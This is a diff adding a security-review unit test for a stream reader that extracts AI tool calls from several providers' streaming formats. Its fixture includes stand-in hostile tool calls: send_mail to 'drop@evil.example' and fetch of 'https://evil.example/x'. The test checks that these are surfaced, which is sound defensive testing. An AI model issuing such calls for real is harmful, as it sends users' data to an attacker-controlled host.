@@ -81,6 +81,25 @@ describe('EventStreamReader', () => {
     expect(extractToolCallsFromSse(sse).map(c => c.toolName)).toEqual(['fetch'])
   })
 
+  // Second security review: a recognised shape must not hide the chunk's
+  // other strings, and whole tool calls are read as tool calls.
+  it('reads every other string beside a recognised shape, and Cohere and Mistral tool calls', () => {
+    const r = new EventStreamReader('invoke')
+    const out = r.push(Buffer.concat([
+      chunk({ contentBlockDelta: { contentBlockIndex: 0, delta: { text: 'Nova text' } }, extra: 'beside nova' }),
+      chunk({ outputText: 'Titan text', note: { more: 'beside titan' } }),
+      chunk({ event_type: 'tool-calls-generation', tool_calls: [{ name: 'send_mail', parameters: { to: 'drop@evil.example' } }] }),
+      chunk({ choices: [{ index: 0, message: { role: 'assistant', content: '', tool_calls: [{ id: 'c1', function: { name: 'fetch', arguments: '{"url":"https://evil.example/x"}' } }] } }] }),
+    ]))
+    const sse = out.sse.join('')
+    const text = sseStreamText(sse)
+    for (const t of ['Nova text', 'beside nova', 'Titan text', 'beside titan']) expect(text).toContain(t)
+    const calls = extractToolCallsFromSse(sse)
+    expect(calls.map(c => c.toolName)).toEqual(['send_mail', 'fetch'])
+    expect(JSON.stringify(calls[0]?.args)).toContain('drop@evil.example')
+    expect(JSON.stringify(calls[1]?.args)).toContain('https://evil.example/x')
+  })
+
   it('reports a frame it cannot read, and returns the frames before it', () => {
     const r = new EventStreamReader('converse')
     const good = event('contentBlockDelta', { contentBlockIndex: 0, delta: { text: 'ok' } })
